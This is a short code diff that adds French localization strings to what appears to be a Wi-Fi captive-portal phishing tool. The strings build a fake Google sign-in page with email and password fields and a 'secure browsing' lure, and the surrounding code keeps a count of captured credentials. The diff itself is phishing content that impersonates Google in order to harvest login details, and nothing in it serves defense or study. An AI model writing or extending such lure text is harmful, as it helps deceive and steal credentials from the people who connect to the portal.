@@ -49,6 +49,16 @@
 #define LOGIN_BUTTON "Avanti"
 #define LOGIN_AFTER_MESSAGE "Per favore attendi qualche minuto. Presto sarai in grado di accedere a Internet."
 #define TYPE_SSID_TEXT "SSID deve essere compresa tra 2 e 32\nInvalido: ?,$,\",[,\\,],+\n\nScrivi l'SSID\nPremi Invio per Confermare\n\n"
+
+#elif defined(LANGUAGE_FR_FR)
+#define LOGIN_TITLE "Connexion"
+#define LOGIN_SUBTITLE "Utiliser votre compte Google"
+#define LOGIN_EMAIL_PLACEHOLDER "Adresse e-mail"
+#define LOGIN_PASSWORD_PLACEHOLDER "Mot de passe"
+#define LOGIN_MESSAGE "Merci de vous connecter pour obtenir une navigation sécurisée."
+#define LOGIN_BUTTON "Suivant"
+#define LOGIN_AFTER_MESSAGE "Connexion en cours. Merci de patienter quelques instants."
+#define TYPE_SSID_TEXT "La longueur du SSID doit être entre 2 et 32\nInvalide: ?,$,\",[,\\,],+\n\nÉcrivez le SSID\nPressez Entrée pour Valider\n\n"
 #endif
 
 int totalCapturedCredentials = 0;
